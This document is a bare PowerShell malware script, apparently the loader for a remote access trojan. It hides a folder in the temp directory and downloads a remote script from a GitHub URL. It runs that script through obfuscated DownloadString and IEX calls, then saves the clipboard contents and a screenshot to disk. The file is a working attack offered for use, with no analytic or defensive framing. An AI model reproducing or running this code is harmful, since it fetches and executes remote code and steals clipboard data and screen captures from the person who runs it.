$dir = "$env:temp\loader"
New-Item -ItemType Directory -Path $dir
attrib +h +s $dir
cd $dir
Set-Location -Path $dir

$shellcode = ("https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/shell/data.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
$proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
$proc.WaitForExit()

Get-Clipboard | Out-File -FilePath "clip.txt" -Encoding utf8

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('{PRTSC}')
Start-Sleep -Milliseconds 500
$img = [System.Windows.Forms.Clipboard]::GetImage()
$img.Save('screenshot.png')

